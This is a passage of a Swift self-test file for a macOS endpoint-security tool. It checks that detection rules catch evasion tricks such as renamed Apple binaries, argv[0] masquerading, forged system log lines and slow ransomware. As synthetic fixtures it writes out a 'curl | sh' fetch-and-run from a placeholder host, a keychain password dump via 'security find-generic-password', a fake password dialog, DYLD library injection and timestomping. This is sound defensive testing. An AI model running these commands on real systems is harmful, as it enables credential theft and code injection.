import Foundation
import RampartShared
import RampartTelemetry
import RampartBehaviour
import RampartGuard

// WMS o6 — detection evasion (2026-11-13). Synthetic event streams only: nothing is executed, no real
// malware, no network. Each check names the evasion it pins down. See docs/security/wms-o6.md.

private final class O6Box: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [SecurityEvent] = []
    private var gaps: [Int] = []
    private var lines: [String] = []
    func add(_ e: SecurityEvent) { lock.lock(); items.append(e); lock.unlock() }
    func gap(_ n: Int) { lock.lock(); gaps.append(n); lock.unlock() }
    func line(_ s: String) { lock.lock(); lines.append(s); lock.unlock() }
    var all: [SecurityEvent] { lock.lock(); defer { lock.unlock() }; return items }
    var allGaps: [Int] { lock.lock(); defer { lock.unlock() }; return gaps }
    var allLines: [String] { lock.lock(); defer { lock.unlock() }; return lines }
}

private func o6Wait(_ timeout: TimeInterval, _ cond: () -> Bool) -> Bool {
    let end = Date().addingTimeInterval(timeout)
    while Date() < end { if cond() { return true }; Thread.sleep(forTimeInterval: 0.02) }
    return cond()
}

private func o6Proc(pid: Int, ppid: Int, path: String, sid: String?, platform: Bool) -> String {
    let s = sid.map { "\"\($0)\"" } ?? "null"
    return "{\"audit_token\":{\"pid\":\(pid),\"euid\":501},\"executable\":{\"path\":\"\(path)\"},\"ppid\":\(ppid)," +
        "\"signing_id\":\(s),\"team_id\":null,\"is_platform_binary\":\(platform)}"
}

private func o6Line(seq: Int, process: String, event: String) -> String {
    "{\"schema_version\":1,\"version\":9,\"time\":\"2026-11-13T10:00:00.000000000Z\",\"global_seq_num\":\(seq)," +
        "\"process\":\(process),\"event\":\(event)}"
}

private func o6File(_ p: String) -> String { "{\"path\":\"\(p)\",\"path_truncated\":false}" }

extension BehaviourSim {
    /// exec with an explicit signing identity / platform flag (a renamed Apple binary keeps both).
    @discardableResult
    func execSigned(_ path: String, _ args: [String] = [], argv0: String? = nil, parent: Int32, signingID: String?, platform: Bool,
                    detail: [String: String] = [:]) -> Int32 {
        t += 0.2
        nextPid += 1
        let p = nextPid
        let info = ProcessInfoLite(pid: p, ppid: parent, path: path, args: [argv0 ?? path] + args, uid: 501,
                                   signingID: signingID, isPlatformBinary: platform)
        procs[p] = info
        var d = detail; d["start"] = String(t.timeIntervalSince1970) + ".\(p)"
        feed(SecurityEvent(date: t, kind: .exec, process: info, path: path, detail: d, source: "test"))
        return p
    }
}

extension SelfTest {
    static func wmsO6Checks() {
        o6ParserChecks()
        o6StreamChecks()
        o6HubChecks()
        o6LogSpoofChecks()
        o6RenamedToolChecks()
        o6MasqueradeChecks()
        o6LotlChecks()
        o6RansomChecks()
        o6DeceptionChecks()
        o6DevNoiseChecks()
    }

    // MARK: eslogger parser: malformed, adversarial, desync

    static func o6ParserChecks() {
        let p = EsloggerParser()
        p.responsiblePathResolver = nil
        let zsh = o6Proc(pid: 100, ppid: 1, path: "/bin/zsh", sid: "com.apple.zsh", platform: true)
        // Garbage of every shape: no crash, nothing parsed.
        let deep = "{\"schema_version\":1,\"event\":{\"exec\":" + String(repeating: "[", count: 100_000) + String(repeating: "]", count: 100_000) + "}}"
        let junk = ["", " ", "\u{0}\u{1}\u{2}", "{", "}", "[[[[", "null", "1e999", "\"str\"", "{\"event\":5}", "{\"event\":{}}",
                    "{\"event\":{\"exec\":null}}", "{\"event\":{\"exec\":{\"target\":\"x\"}},\"process\":[]}",
                    "{\"event\":{\"exec\":{\"target\":{\"audit_token\":{\"pid\":\"abc\"}}}}}",
                    "{\"event\":{\"exec\":{\"target\":{\"audit_token\":{\"pid\":1e300}}}}}",
                    "{\"event\":{\"rename\":{\"source\":7,\"destination\":{\"new_path\":{\"dir\":[],\"filename\":9}}}},\"process\":{}}",
                    String(decoding: [0xFF, 0xFE, 0x7B, 0x22], as: UTF8.self), deep]
        for j in junk { _ = p.parse(line: j) }   // must not crash or trap
        check(p.stats.tooDeep == 1, "o6.parser: 100k-deep nesting rejected before JSON decode (no stack exhaustion)")
        check(p.stats.parsed <= 2, "o6.parser: junk lines don't become events (\(p.stats.parsed) parsed)")
        // Ambiguous wrapper: two events under "event" is malformed, not "whichever key comes first".
        let two = o6Line(seq: 1, process: zsh, event: "{\"unlink\":{\"target\":\(o6File("/tmp/a"))},\"exec\":{\"target\":\(zsh)}}")
        check(p.parse(line: two) == nil, "o6.parser: multi-key event wrapper rejected")

        // argv bounds: a 50k-argument exec can't flow into every rule regex.
        let manyArgs = "[" + (0..<50_000).map { "\"a\($0)\"" }.joined(separator: ",") + "]"
        let big = p.parse(line: o6Line(seq: 2, process: zsh, event: "{\"exec\":{\"target\":\(zsh),\"args\":\(manyArgs)}}"))
        check((big?.process?.args.count ?? Int.max) <= EsloggerParser.maxArgs, "o6.parser: argv count capped (\(big?.process?.args.count ?? -1))")
        let huge = String(repeating: "A", count: 200_000)
        let one = p.parse(line: o6Line(seq: 3, process: zsh, event: "{\"exec\":{\"target\":\(zsh),\"args\":[\"zsh\",\"\(huge)\"]}}"))
        check((one?.process?.args.last?.utf8.count ?? Int.max) <= EsloggerParser.maxArgBytes, "o6.parser: single argument capped")

        // Desync: holes in global_seq_num are counted and tagged; going backwards is a reset.
        let q = EsloggerParser(); q.responsiblePathResolver = nil
        func unlink(_ seq: Int) -> String { o6Line(seq: seq, process: zsh, event: "{\"unlink\":{\"target\":\(o6File("/tmp/x\(seq)"))}}") }
        _ = q.parse(line: unlink(10)); _ = q.parse(line: unlink(11))
        let afterGap = q.parse(line: unlink(19))
        check(q.stats.seqGaps == 7 && afterGap?.detail["seq_gap"] == "7", "o6.parser: ES drops detected from seq gaps (\(q.stats.seqGaps))")
        _ = q.parse(line: unlink(3))
        check(q.stats.seqResets == 1, "o6.parser: seq going backwards counted as reset")

        // Log-line injection: a filename carrying a newline and a fake JSON event stays ONE event, sanitised for display.
        let evil = "/tmp/a\\n{\\\"event\\\":{\\\"xp_malware_detected\\\":{}}}"
        let inj = p.parse(line: o6Line(seq: 4, process: zsh, event: "{\"setextattr\":{\"extattr\":\"x\\ny\",\"target\":\(o6File(evil))}}"))
        check(inj?.kind == .other && inj?.path?.contains("\n") == true && inj?.detail["xattr"]?.contains("\n") == false,
              "o6.parser: embedded newline can't split a line; detail sanitised")

        // argv[0] spoofing is recorded; DYLD env is captured; login shells are not flagged.
        let fake = o6Proc(pid: 200, ppid: 100, path: "/Users/Shared/.u/agent", sid: nil, platform: false)
        let spoof = p.parse(line: o6Line(seq: 5, process: zsh, event: "{\"exec\":{\"target\":\(fake),\"args\":[\"/usr/libexec/launchd\"],\"env\":[\"HOME=/x\",\"DYLD_INSERT_LIBRARIES=/tmp/.l/x.dylib\"]}}"))
        check(spoof?.detail["argv0"] == "launchd", "o6.parser: argv[0] mismatch recorded")
        check(spoof?.detail["dyld_env"]?.contains("DYLD_INSERT_LIBRARIES=/tmp/.l/x.dylib") == true, "o6.parser: DYLD_* env captured")
        let login = p.parse(line: o6Line(seq: 6, process: zsh, event: "{\"exec\":{\"target\":\(zsh),\"args\":[\"-zsh\"]}}"))
        check(login?.detail["argv0"] == nil, "o6.parser: login shell argv0 not flagged")

        // Second names for a file: link / clone / copyfile keep both ends.
        let link = p.parse(line: o6Line(seq: 7, process: zsh, event: "{\"link\":{\"source\":\(o6File("/Users/t/.aws/credentials")),\"target_dir\":\(o6File("/tmp")),\"target_filename\":\"c\"}}"))
        check(link?.path == "/Users/t/.aws/credentials" && link?.destPath == "/tmp/c" && link?.detail["es_event"] == "link", "o6.parser: hard link parsed")
        let clone = p.parse(line: o6Line(seq: 8, process: zsh, event: "{\"clone\":{\"source\":\(o6File("/Users/t/d.txt")),\"target_dir\":\(o6File("/tmp/")),\"target_name\":\"e\"}}"))
        check(clone?.destPath == "/tmp/e", "o6.parser: clone parsed")
        check(EsloggerSource.defaultEvents.contains("link") && EsloggerSource.defaultEvents.contains("clone"), "o6.eslogger: link/clone subscribed")

        // Gap reporting is rate limited and accumulates.
        let gr = GapReporter(source: "t")
        let t0 = Date(timeIntervalSince1970: 1_800_000_000)
        let a = gr.note(reason: "es_drop", lost: 5, at: t0)
        let b = gr.note(reason: "backpressure", lost: 7, at: t0.addingTimeInterval(1))
        let c = gr.note(reason: "es_drop", lost: 1, at: t0.addingTimeInterval(11))
        check(a?.detail["type"] == "telemetry_gap" && b == nil && c?.detail["lost"] == "8", "o6.gap: one telemetry_gap per interval, losses summed")
    }

    // MARK: child stream backpressure

    static func o6StreamChecks() {
        let s = ChildLineStream(executable: "/usr/bin/true", arguments: [], label: "o6test")
        s.maxPendingBytes = 4096
        let box = O6Box()
        s.onLine = { box.line(String(decoding: $0, as: UTF8.self)) }
        s.onGap = { box.gap($0) }
        // 800 lines in 13-byte chunks that cut lines in the middle; the first chunk stalls the consumer so the backlog
        // passes the cap. Then 100 more lines once the consumer has caught up (the first of them triggers the resync).
        func lines(_ r: Range<Int>) -> Data {
            var d = Data(); for i in r { d.append(contentsOf: Array(String(format: "LINE-%06d\n", i).utf8)) }; return d
        }
        func send(_ all: Data, stallFirst: Bool) {
            var off = 0, first = stallFirst
            while off < all.count {
                let n = min(13, all.count - off)
                s.simulateOutput(all.subdata(in: off..<off + n), consumerDelay: first ? 0.3 : 0)
                first = false; off += n
            }
        }
        send(lines(0..<800), stallFirst: true)
        s.drainForTest()
        send(lines(800..<900), stallFirst: false)
        s.drainForTest()
        let lines = box.allLines
        let wellFormed = lines.allSatisfy { $0.count == 11 && $0.hasPrefix("LINE-") && Int($0.dropFirst(5)) != nil }
        check(s.droppedBackpressureBytes > 0 && !box.allGaps.isEmpty, "o6.stream: backlog over the cap is dropped and reported (\(s.droppedBackpressureBytes) B)")
        check(wellFormed && !lines.isEmpty, "o6.stream: after a drop the stream resyncs; no spliced half-lines (\(lines.count) lines)")
    }

    // MARK: hub flooding

    static func o6HubChecks() {
        let hub = EventHub()
        let box = O6Box()
        hub.start { box.add($0) }
        for i in 0..<500 {
            let p = ProcessInfoLite(pid: Int32(30_000 + i), ppid: 777, path: "/usr/bin/true", args: ["true"], isPlatformBinary: false)
            hub.ingest(SecurityEvent(kind: .exec, process: p, path: p.path, source: "eslogger"))
        }
        let real = ProcessInfoLite(pid: 31_000, ppid: 777, path: "/Users/Shared/.x/payload", args: ["payload"])
        hub.ingest(SecurityEvent(kind: .exec, process: real, path: real.path, source: "eslogger"))
        _ = o6Wait(3) { box.all.contains { $0.process?.pid == 31_000 } }
        let st = hub.currentStats
        check(st.floodCollapsed >= 400, "o6.hub: identical exec storm collapsed (\(st.floodCollapsed))")
        check(box.all.contains { $0.process?.pid == 31_000 }, "o6.hub: the real exec behind the storm is delivered")
        hub.stop()

        // Overflow: shedding raises a telemetry_gap on the never-shed queue.
        var cfg = EventHub.Config(); cfg.bufferCapacity = 50; cfg.dedupeWindow = 0
        let hub2 = EventHub(config: cfg)
        let box2 = O6Box()
        hub2.start { e in Thread.sleep(forTimeInterval: 0.002); box2.add(e) }
        for i in 0..<2000 {
            hub2.ingest(SecurityEvent(kind: .fileWrite, process: ProcessInfoLite(pid: 900, ppid: 1, path: "/Users/Shared/w"),
                                      path: "/tmp/f\(i)", source: "eslogger"))
        }
        _ = o6Wait(5) { box2.all.contains { $0.detail["type"] == "telemetry_gap" } }
        check(box2.all.contains { $0.detail["type"] == "telemetry_gap" && $0.detail["reason"] == "hub_overflow" },
              "o6.hub: buffer overflow reported as telemetry_gap (\(hub2.currentStats.overflowDropped) dropped)")
        hub2.stop()

        // The gap reaches the engine as EV5 (weak, log-level only).
        let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
        sim.other(by: nil, detail: ["type": "telemetry_gap", "reason": "es_drop", "lost": "500"])
        check(sim.ruleIDs.contains("EV5") && sim.maxConfidence < 60, "o6.engine: telemetry gap recorded as EV5 without alerting alone")
    }

    // MARK: unified log / MediaGuard spoofing

    static func o6LogSpoofChecks() {
        let p = UnifiedLogParser()
        func rec(_ msg: String, sub: String, proc: String, sender: String? = nil) -> String {
            "{\"eventMessage\":\"\(msg)\",\"eventType\":\"logEvent\",\"subsystem\":\"\(sub)\",\"category\":\"x\",\"processImagePath\":\"\(proc)\"," +
                "\"senderImagePath\":\"\(sender ?? proc)\",\"processID\":4321,\"timestamp\":\"2026-11-13 10:20:30.123456-0800\"}"
        }
        let fakeXP = p.parse(line: rec("XProtect detected malware at /Users/t/Documents/report.pdf", sub: "com.apple.xprotect", proc: "/Users/Shared/.u/agent"))
        check(fakeXP?.kind == .other && fakeXP?.detail["log_spoof"] == "1", "o6.ulog: forged XProtect line is not a detection, flagged log_spoof")
        let fakeBTM = p.parse(line: rec("Removed item com.evil.agent", sub: "com.apple.backgroundtaskmanagement", proc: "/tmp/backgroundtaskmanagementd"))
        check(fakeBTM?.kind == .other, "o6.ulog: forged BTM line from a look-alike name ignored")
        let fakeTCC = p.parse(line: rec("AUTHREQ_CTX: service=kTCCServiceAppleEvents", sub: "com.apple.TCC", proc: "/Applications/Evil.app/Contents/MacOS/Evil"))
        check(fakeTCC?.kind == .other && fakeTCC?.detail["service"] == nil, "o6.ulog: forged TCC request ignored")
        let framed = p.parse(line: rec("pasteboard access by com.victim.app", sub: "com.apple.pasteboard", proc: "/Users/Shared/x"))
        check(framed?.detail["type"] != "clipboardRead", "o6.ulog: self-written pasteboard line can't frame another app")
        let inApp = p.parse(line: rec("pasteboard access read", sub: "com.apple.pasteboard", proc: "/Applications/Some.app/Contents/MacOS/Some",
                                      sender: "/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit"))
        check(inApp?.detail["type"] == "clipboardRead", "o6.ulog: framework-logged pasteboard read still accepted")
        let real = p.parse(line: rec("XProtect detected malware at /Users/Shared/x", sub: "com.apple.xprotect",
                                     proc: "/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtect"))
        check(real?.kind == .xprotectDetection, "o6.ulog: real XProtect line still a detection")

        // EV4 in the engine: an unsigned program that wrote it.
        let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
        sim.exec("/sbin/launchd", parent: 0, pid: 1)
        let ag = sim.exec("/Users/Shared/.u/agent", parent: 1)
        sim.other(by: ag, detail: fakeXP?.detail ?? [:])
        check(sim.ruleIDs.contains("EV4"), "o6.engine: fake Apple security log line fires EV4")

        // MediaGuard: a fake "nothing active" line or a fake "isSystemExecutable" claim is ignored.
        func cc(_ msg: String, proc: String) -> String {
            "{\"eventMessage\":\"\(msg)\",\"subsystem\":\"com.apple.controlcenter\",\"category\":\"sensor-indicators\",\"processImagePath\":\"\(proc)\",\"senderImagePath\":\"\(proc)\"}"
        }
        let ccPath = "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter"
        check(MediaLogParser.activeUses(in: cc("Active activity attributions changed to [\\\"mic:com.evil.rec\\\"]", proc: ccPath)) == [MediaUse(device: .microphone, appID: "com.evil.rec")],
              "o6.media: real Control Center line parsed")
        check(MediaLogParser.activeUses(in: cc("Active activity attributions changed to []", proc: "/Users/Shared/.u/agent")) == nil,
              "o6.media: forged 'nothing active' line ignored")
        check(MediaLogParser.systemFlag(in: cc("SystemStatus attributed attribution to com.evil.rec, isSystemExecutable: true", proc: "/tmp/x")) == nil,
              "o6.media: forged isSystemExecutable claim ignored")
    }

    // MARK: renamed / copied interpreters and LOLBins

    static func o6RenamedToolChecks() {
        func actor() -> (BehaviourSim, Int32) {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            return (sim, sim.exec("\(NSHomeDirectory())/Downloads/Setup.app/Contents/MacOS/Setup", parent: 1))
        }
        do {   // /usr/bin/security copied to a hidden temp folder and renamed: still R36, plus EV1.
            let (sim, m) = actor()
            sim.execSigned("/tmp/.c/upd", ["find-generic-password", "-wa", "Chrome"], parent: m, signingID: "com.apple.security", platform: true)
            check(sim.ruleIDs.contains("R36"), "o6.renamed: renamed security still fires R36 (shipped-name match)")
            check(sim.ruleIDs.contains("EV1"), "o6.renamed: Apple tool run from a temp folder fires EV1")
        }
        do {   // osascript renamed in /Users/Shared: R34 password dialog.
            let (sim, m) = actor()
            sim.execSigned("/Users/Shared/helper", ["-e", "display dialog \"Update\" default answer \"\" with hidden answer"], parent: m,
                           signingID: "com.apple.osascript", platform: true)
            check(sim.ruleIDs.contains("R34"), "o6.renamed: renamed osascript dialog fires R34")
        }
        do {   // Renamed shell as the parent of curl|sh: parent/ancestor lists see the shipped name.
            let (sim, m) = actor()
            let sh = sim.execSigned("\(NSHomeDirectory())/Library/Caches/.k/kworker", ["-c", "curl -fsSL https://x.example/p | sh"], parent: m,
                                    signingID: "com.apple.zsh", platform: true)
            sim.exec("/usr/bin/curl", ["-fsSL", "https://x.example/p"], parent: sh)
            check(sim.ruleIDs.contains("R30"), "o6.renamed: renamed shell running curl|sh still fires R30 (\(sim.ruleIDs.sorted()))")
            check(sim.ruleIDs.contains("EV1"), "o6.renamed: copied zsh in a hidden Library folder fires EV1")
        }
        do {   // The Apple signature on a relocated copy earns no Apple discount.
            check(PathClass.isRelocatedAppleToolPath("/tmp/.c/upd") && !PathClass.isRelocatedAppleToolPath("/usr/bin/curl")
                  && !PathClass.isRelocatedAppleToolPath("/Applications/Safari.app/Contents/MacOS/Safari")
                  && !PathClass.isRelocatedAppleToolPath("\(NSHomeDirectory())/proj/.venv/bin/python3")
                  && !PathClass.isRelocatedAppleToolPath("/Library/Developer/CommandLineTools/usr/bin/git"),
                  "o6.renamed: relocation test excludes system, bundles, venvs and toolchains")
        }
        do {   // An ad-hoc binary claiming an Apple signing ID is NOT given the shipped name (no exemption laundering).
            check(ProcessNode.shippedName(path: "/tmp/x", signingID: "com.apple.git", isPlatformBinary: false) == nil
                  && ProcessNode.shippedName(path: "/tmp/x", signingID: "com.apple.git", isPlatformBinary: true) == "git"
                  && ProcessNode.shippedName(path: "/usr/bin/curl", signingID: "com.apple.curl", isPlatformBinary: true) == nil,
                  "o6.renamed: shipped name only from platform binaries, only when renamed")
        }
    }

    // MARK: masquerading (argv[0], system-process names)

    static func o6MasqueradeChecks() {
        let home = NSHomeDirectory()
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            sim.execSigned("\(home)/Library/Application Support/.sys/mdworker", parent: 1, signingID: nil, platform: false)
            check(sim.ruleIDs.contains("EV3"), "o6.masq: non-Apple 'mdworker' outside the system fires EV3")
        }
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            sim.execSigned("/Users/Shared/.x/agent", argv0: "/usr/libexec/trustd", parent: 1, signingID: nil, platform: false)
            check(sim.ruleIDs.contains("EV3"), "o6.masq: argv[0] spoofed as trustd fires EV3")
        }
        do {   // Benign: login shell, Homebrew `lsd`, real Apple daemons, a renamed own build.
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("/opt/homebrew/bin/lsd", ["-la"], parent: zsh)
            sim.execSigned("/usr/libexec/trustd", parent: 1, signingID: "com.apple.trustd", platform: true)
            sim.execSigned("/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared",
                           parent: 1, signingID: "com.apple.mdworker_shared", platform: true)
            check(!sim.ruleIDs.contains("EV3") && !sim.ruleIDs.contains("EV1"), "o6.masq: no EV1/EV3 on normal system and dev processes (\(sim.ruleIDs.sorted()))")
        }
    }

    // MARK: living off the land, DYLD injection

    static func o6LotlChecks() {
        let home = NSHomeDirectory()
        func actor() -> (BehaviourSim, Int32) {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            return (sim, sim.exec("\(home)/Downloads/Setup.app/Contents/MacOS/Setup", parent: 1))
        }
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/env", ["DYLD_INSERT_LIBRARIES=/tmp/.l/hook.dylib", "/Applications/Wallet.app/Contents/MacOS/Wallet"], parent: m)
            check(sim.ruleIDs.contains("EV2"), "o6.lotl: DYLD_INSERT_LIBRARIES from a temp folder fires EV2")
        }
        do {
            let (sim, m) = actor()
            sim.exec("/Applications/Wallet.app/Contents/MacOS/Wallet", parent: m, detail: ["dyld_env": "DYLD_INSERT_LIBRARIES=\(home)/.cache2/x.dylib"])
            check(sim.ruleIDs.contains("EV2"), "o6.lotl: DYLD env seen by eslogger fires EV2")
        }
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/plutil", ["-replace", "LSEnvironment", "-json", "{\"DYLD_INSERT_LIBRARIES\":\"/tmp/x.dylib\"}", "/Applications/Wallet.app/Contents/Info.plist"], parent: m)
            check(sim.ruleIDs.contains("EV2"), "o6.lotl: plutil adding a DYLD LSEnvironment fires EV2")
        }
        do {   // Benign: Xcode sanitizer / debugger injection.
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("\(home)/proj/.build/debug/app", parent: zsh,
                     detail: ["dyld_env": "DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/Contents/Developer/usr/lib/libMainThreadChecker.dylib"])
            sim.exec("/usr/bin/env", ["DYLD_INSERT_LIBRARIES=/tmp/x/libclang_rt.asan_osx_dynamic.dylib", "./a.out"], parent: zsh)
            check(!sim.ruleIDs.contains("EV2"), "o6.lotl: Xcode/ASan dylib injection is not EV2")
        }
        do {
            let (sim, m) = actor()
            let sh = sim.exec("/bin/sh", ["-c", "x"], parent: m)
            sim.exec("/usr/bin/touch", ["-t", "202001010000", "\(home)/Library/LaunchAgents/com.apple.upd.plist"], parent: sh)
            sim.exec("/usr/bin/osascript", ["-l", "JavaScript", "-e", "app.doShellScript('id')"], parent: sh)
            sim.exec("/usr/bin/chflags", ["hidden", "/Users/Shared/.u/agent", "/tmp/agent"], parent: sh)
            check(sim.ruleIDs.isSuperset(of: ["EV6", "EV7", "EV8"]), "o6.lotl: timestomp, JXA shell-out and chflags hidden scored (\(sim.ruleIDs.sorted()))")
        }
        do {   // Benign: the user does the same by hand in a trusted session.
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("/usr/bin/touch", ["-t", "202001010000", "\(home)/notes.txt"], parent: zsh)
            sim.exec("/usr/bin/osascript", ["-l", "JavaScript", "-e", "Application('Music').play()"], parent: zsh)
            sim.exec("/usr/bin/chflags", ["hidden", "\(home)/Library"], parent: zsh)
            check(sim.ruleIDs.intersection(["EV6", "EV7", "EV8"]).isEmpty, "o6.lotl: hand-typed touch/JXA/chflags stay quiet")
        }
    }

    // MARK: ransomware below thresholds

    static func o6RansomChecks() {
        let fm = FileManager.default
        let root = (ProcessInfo.processInfo.environment["RAMPART_SCRATCH"] ?? NSTemporaryDirectory()) + "/rampart-o6-\(UUID().uuidString.prefix(8))"
        let docs = root + "/Documents"
        try? fm.createDirectory(atPath: docs + "/a", withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: root + "/stage", withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: root) }
        func random(_ n: Int) -> Data { Data((0..<n).map { _ in UInt8.random(in: 0...255) }) }
        let cfg = RansomwareConfig(protectedRoots: [docs])
        let t0 = Date(timeIntervalSince1970: 1_800_000_000)
        let proc = ProcessInfoLite(pid: 4000, ppid: 1, path: "/Users/Shared/.x/w")

        do {   // One file every 5 minutes: never a burst, still R02 within the slow window.
            let det = RansomwareDetector(config: cfg)
            var hitAt: Int?
            for i in 0..<30 {
                let p = docs + "/a/f\(i).bin"
                fm.createFile(atPath: p, contents: random(8192))
                let hs = det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i) * 300), kind: .fileWrite, process: proc, path: p, source: "t"), actorKey: "p:1")
                if hitAt == nil, hs.contains(where: { $0.ruleID == "R02" }) { hitAt = i + 1 }
            }
            check(hitAt == cfg.slowEncryptedCount, "o6.ransom: slow-and-low encryption caught at \(hitAt ?? -1) files")
        }
        do {   // One fresh worker per file (different actor keys): the machine-wide slow counter still catches it.
            let det = RansomwareDetector(config: cfg)
            var hit = false
            for i in 0..<cfg.slowGlobalCount {
                let p = docs + "/a/g\(i).bin"
                fm.createFile(atPath: p, contents: random(8192))
                if det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i) * 120), kind: .fileWrite, process: proc, path: p, source: "t"),
                               actorKey: "p:\(i)").contains(where: { $0.ruleID == "R02" }) { hit = true }
            }
            check(hit, "o6.ransom: per-file worker processes caught machine-wide")
        }
        do {   // Encrypt elsewhere, then rename over the original: content check follows the rename.
            let det = RansomwareDetector(config: cfg)
            var hit = false
            for i in 0..<12 {
                let dst = docs + "/a/r\(i).docx"
                fm.createFile(atPath: dst, contents: random(8192))   // the state after the rename
                if det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i)), kind: .fileRename, process: proc, path: root + "/stage/r\(i).tmp",
                                             destPath: dst, source: "t"), actorKey: "p:2").contains(where: { $0.ruleID == "R02" }) { hit = true }
            }
            check(hit, "o6.ransom: encrypt-then-rename-over caught (R02)")
        }
        do {   // A different random extension per file defeats R04's same-extension count; the appended count catches it.
            let det = RansomwareDetector(config: cfg)
            var hit = false
            for i in 0..<20 {
                let src = docs + "/a/n\(i).pdf"
                let ext = String((0..<6).map { _ in "abcdefghijklmnopqrstuvwxyz".randomElement()! })
                if det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i) * 5), kind: .fileRename, process: proc, path: src,
                                             destPath: src + "." + ext, source: "t"), actorKey: "p:3").contains(where: { $0.ruleID == "R04" }) { hit = true }
            }
            check(hit, "o6.ransom: per-file random extensions caught (R04)")
        }
        do {   // Rename-only hostage: user files moved into a hidden temp folder.
            let det = RansomwareDetector(config: cfg)
            var hit = false
            for i in 0..<20 {
                if det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i)), kind: .fileRename, process: proc, path: docs + "/a/m\(i).pages",
                                             destPath: "/private/tmp/.hold/m\(i).pages", source: "t"), actorKey: "p:4").contains(where: { $0.ruleID == "R04" }) { hit = true }
            }
            check(hit, "o6.ransom: mass move of user files into a hidden temp folder caught (R04)")
        }
        do {   // Benign: the user's own app saving normally, and 24 random files over hours (below the slow count).
            let det = RansomwareDetector(config: cfg)
            var any = false
            for i in 0..<(cfg.slowEncryptedCount - 1) {
                let p = docs + "/a/s\(i).bin"
                fm.createFile(atPath: p, contents: random(8192))
                if !det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i) * 600), kind: .fileWrite, process: proc, path: p, source: "t"),
                                actorKey: "p:5", trustedGUIActor: true).isEmpty { any = true }
            }
            for i in 0..<30 {   // editor atomic saves / backups
                let p = docs + "/a/doc\(i).txt"
                if !det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i)), kind: .fileRename, process: proc, path: p, destPath: p + ".bak", source: "t"),
                                actorKey: "p:6", trustedGUIActor: true).isEmpty { any = true }
            }
            check(!any, "o6.ransom: slow benign writes and .bak renames stay quiet")
        }
        do {   // Flood of unique ransom-note-like names: tables stay bounded.
            var c2 = cfg; c2.maxKeys = 1000
            let det = RansomwareDetector(config: c2)
            for i in 0..<5000 {
                _ = det.observe(SecurityEvent(date: t0.addingTimeInterval(Double(i) * 0.001), kind: .fileCreate, process: proc,
                                              path: docs + "/a/README-\(i).txt", source: "t"), actorKey: "p:\(i)")
            }
            check(det.tableKeyCount <= 4 * 1001 + 10, "o6.ransom: per-key tables bounded under a flood (\(det.tableKeyCount))")
        }
    }

    // MARK: decoys

    static func o6DeceptionChecks() {
        let mdimport = ProcessInfoLite(pid: 50, ppid: 4242, path: "/usr/bin/mdimport", signingID: "com.apple.mdimport", isPlatformBinary: true)
        var byLaunchd = mdimport; byLaunchd.ppid = 1
        let copied = ProcessInfoLite(pid: 51, ppid: 1, path: "/tmp/.c/mdworker", signingID: "com.apple.mdworker", isPlatformBinary: true)
        let realMD = ProcessInfoLite(pid: 52, ppid: 1, path: "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mdworker",
                                     signingID: "com.apple.mdworker", isPlatformBinary: true)
        check(!DeceptionBenign.isBenign(mdimport), "o6.decoy: script-driven mdimport reading a decoy is a catch")
        check(DeceptionBenign.isBenign(byLaunchd), "o6.decoy: launchd-started mdimport stays benign")
        check(!DeceptionBenign.isBenign(copied), "o6.decoy: Apple indexer copied to /tmp is not exempt")
        check(DeceptionBenign.isBenign(realMD), "o6.decoy: real mdworker stays benign")
    }

    // MARK: no new noise on normal developer activity

    static func o6DevNoiseChecks() {
        let home = NSHomeDirectory()
        let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
        let zsh = sim.terminalSession()
        let git = sim.exec("/usr/bin/git", ["clone", "https://github.com/apple/swift-argument-parser"], parent: zsh)
        sim.exec("/Library/Developer/CommandLineTools/usr/bin/git", ["index-pack"], parent: git)
        let sb = sim.exec("/Library/Developer/CommandLineTools/usr/bin/swift-build", parent: zsh)
        for i in 0..<20 { sim.exec("/Library/Developer/CommandLineTools/usr/bin/swiftc", ["-c", "\(home)/proj/Sources/f\(i).swift"], parent: sb) }
        sim.exec("\(home)/proj/.build/debug/tool", ["--help"], parent: zsh)
        let npm = sim.exec("/opt/homebrew/bin/node", ["/opt/homebrew/bin/npm", "install"], parent: zsh)
        sim.exec("/bin/sh", ["-c", "node-gyp rebuild"], parent: npm)
        sim.execSigned("\(home)/proj/.venv/bin/python3", ["-m", "pytest"], parent: zsh, signingID: "com.apple.python3", platform: true)
        sim.exec("/usr/bin/touch", ["\(home)/proj/README.md"], parent: zsh)
